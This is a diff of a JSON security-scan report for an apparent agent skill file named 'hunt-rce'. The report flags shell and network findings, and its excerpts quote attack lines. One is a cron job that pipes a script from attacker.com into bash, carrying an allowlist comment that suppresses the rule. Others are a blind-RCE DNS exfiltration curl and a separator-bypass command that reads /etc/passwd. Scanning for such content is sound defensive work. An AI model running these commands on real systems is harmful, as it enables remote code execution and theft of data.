@@ -13,7 +13,7 @@
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": false,
-  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scannedAt": "2026-11-08T09:45:03.483Z",
   "scan": {
     "findings": [
       {
@@ -101,8 +101,8 @@
       {
         "ruleId": "shell",
         "file": "plugins/agentic-awesome-skills-claude/skills/hunt-rce/SKILL.md",
-        "line": 230,
-        "excerpt": "# Find internal package names",
+        "line": 231,
+        "excerpt": "grep -r '\"name\"' node_modules/ | grep '@internal\\|@company\\|@private'",
         "disclosed": true,
         "automatic": false
       },
@@ -126,14 +126,6 @@
         "automatic": false
       },
       {
-        "ruleId": "shell",
-        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-rce/SKILL.md",
-        "line": 252,
-        "excerpt": "# Payload to confirm blind RCE via DNS",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
         "ruleId": "network",
         "file": "plugins/agentic-awesome-skills-claude/skills/hunt-rce/SKILL.md",
         "line": 253,
@@ -143,6 +135,14 @@
         "hosts": [
           "$(id"
         ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-rce/SKILL.md",
+        "line": 253,
+        "excerpt": "curl \"http://$(id | base64).YOUR-INTERACTSH-URL/\"",
+        "disclosed": true,
+        "automatic": false
       },
       {
         "ruleId": "network",
@@ -164,12 +164,15 @@
         "automatic": false
       },
       {
-        "ruleId": "shell",
+        "ruleId": "network",
         "file": "plugins/agentic-awesome-skills-claude/skills/hunt-rce/SKILL.md",
-        "line": 276,
-        "excerpt": "# Get the legit CLI jar from the target",
+        "line": 263,
+        "excerpt": "* * * * * root curl http://attacker.com/shell | bash <!-- security-allowlist: curl-pipe-bash -->",
         "disclosed": true,
-        "automatic": false
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
       },
       {
         "ruleId": "network",
@@ -185,16 +188,24 @@
       {
         "ruleId": "shell",
         "file": "plugins/agentic-awesome-skills-claude/skills/hunt-rce/SKILL.md",
-        "line": 307,
-        "excerpt": "# Command injection sinks",
+        "line": 277,
+        "excerpt": "curl -sLO http://target:8080/jnlpJars/jenkins-cli.jar",
         "disclosed": true,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "plugins/agentic-awesome-skills-claude/skills/hunt-rce/SKILL.md",
-        "line": 350,
-        "excerpt": "# Blocked: ; | & ` $()",
+        "line": 308,
+        "excerpt": "grep -rn \"exec\\|system\\|popen\\|spawn\\|eval\\|subprocess\" --include=\"*.rb\" .",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-rce/SKILL.md",
+        "line": 352,
+        "excerpt": "cat${IFS}/etc/passwd",
         "disclosed": true,
         "automatic": false
       },
@@ -217,8 +228,8 @@
       {
         "ruleId": "shell",
         "file": "plugins/agentic-awesome-skills-claude/skills/hunt-rce/SKILL.md",
-        "line": 440,
-        "excerpt": "# Read-only first step; confirm scope before anything active.",
+        "line": 441,
+        "excerpt": "cat scope.txt  # target list from the authorized engagement brief",
         "disclosed": true,
         "automatic": false
       },
@@ -275,13 +286,13 @@
       }
     ],
     "findingTotals": {
-      "network": 9,
+      "network": 10,
       "shell": 18,
       "downloads-code": 2
     },
     "score": 79,
     "band": "review",
-    "rulesVersion": "1.0.0",
+    "rulesVersion": "1.3.0",
     "filesScanned": 3,
     "filesSkipped": 0
   },
@@ -291,6 +302,12 @@
       "scannedAt": "2026-11-06T19:07:48.007Z",
       "score": 79,
       "rulesVersion": "1.0.0"
+    },
+    {
+      "commit": "2984de11956e413008c6f98121cd141c499e47a3",
+      "scannedAt": "2026-11-08T09:45:03.483Z",
+      "score": 79,
+      "rulesVersion": "1.3.0"
     }
   ]
 }
